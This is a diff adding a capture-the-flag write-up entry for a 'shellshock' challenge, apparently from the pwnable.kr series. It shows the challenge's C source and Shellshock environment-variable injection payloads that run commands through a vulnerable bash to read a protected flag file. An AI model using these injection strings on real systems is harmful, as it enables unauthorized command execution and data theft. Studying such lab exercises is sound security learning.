@@ -670,3 +670,22 @@ input password : 0000000000
 Password OK
 
 
+Toddler's Bottle - shellshock
+
+shellshock@ubuntu:~$ cat shellshock.c
+#include <stdio.h>
+int main(){
+	setresuid(getegid(), getegid(), getegid());
+	setresgid(getegid(), getegid(), getegid());
+	system("/home/shellshock/bash -c 'echo shock_me'");
+	return 0;
+}
+
+shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' /home/shellshock/bash -c "echo this is a test"
+vulnerable
+this is a test
+shellshock@ubuntu:~$ env x='() { :;}; cat flag' ./shellshock
+/home/shellshock/bash: cat: No such file or directory
+Segmentation fault
+shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
+
